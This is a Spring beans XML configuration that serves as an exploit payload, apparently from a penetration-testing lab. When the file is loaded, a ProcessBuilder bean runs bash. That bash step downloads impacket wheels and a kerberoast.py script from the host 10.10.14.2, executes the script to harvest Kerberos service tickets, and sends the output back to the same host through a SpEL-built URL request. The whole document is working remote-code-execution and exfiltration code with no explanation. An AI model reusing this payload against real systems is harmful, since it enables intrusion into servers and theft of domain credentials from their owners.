<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value><![CDATA[curl -s http://10.10.14.2:8080/wheels/impacket-0.13.0-py3-none-any.whl -o /tmp/impacket.whl && curl -s http://10.10.14.2:8080/wheels/pyasn1-0.5.1-py2.py3-none-any.whl -o /tmp/pyasn1.whl && curl -s http://10.10.14.2:8080/wheels/pyasn1_modules-0.3.0-py2.py3-none-any.whl -o /tmp/pyasn1m.whl && curl -s http://10.10.14.2:8080/kerberoast.py -o /tmp/kerberoast.py && timeout 45 python3 /tmp/kerberoast.py 2>&1]]></value>
            </list>
        </constructor-arg>
    </bean>
    <bean id="proc" factory-bean="pb" factory-method="start"/>
    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
          factory-method="copyToByteArray">
        <constructor-arg ref="procOut"/>
    </bean>
    <bean id="outStr" class="java.lang.String">
        <constructor-arg ref="outBytes"/>
    </bean>
    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
        <constructor-arg value="#{'http://10.10.14.2:8080/kerbout2?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
    </bean>
    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
</beans>
